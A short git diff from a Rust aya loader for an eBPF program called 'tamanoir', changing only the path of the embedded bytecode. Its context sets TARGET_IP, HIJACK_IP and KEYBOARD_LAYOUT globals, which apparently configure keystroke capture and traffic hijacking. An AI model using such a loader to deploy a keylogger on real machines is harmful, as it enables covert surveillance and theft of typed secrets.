@@ -50,10 +50,9 @@ async fn main() -> anyhow::Result<()> {
         .set_global("TARGET_IP", &target_ip, true)
         .set_global("HIJACK_IP", &hijack_ip, true)
         .set_global("KEYBOARD_LAYOUT", &layout, true)
-        .load(aya::include_bytes_aligned!(concat!(
-            env!("OUT_DIR"),
-            "/tamanoir"
-        )))?;
+        .load(aya::include_bytes_aligned!(
+            "../../target/bpfel-unknown-none/release/tamanoir"
+        ))?;
 
     if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
         warn!("failed to initialize eBPF logger: {}", e);
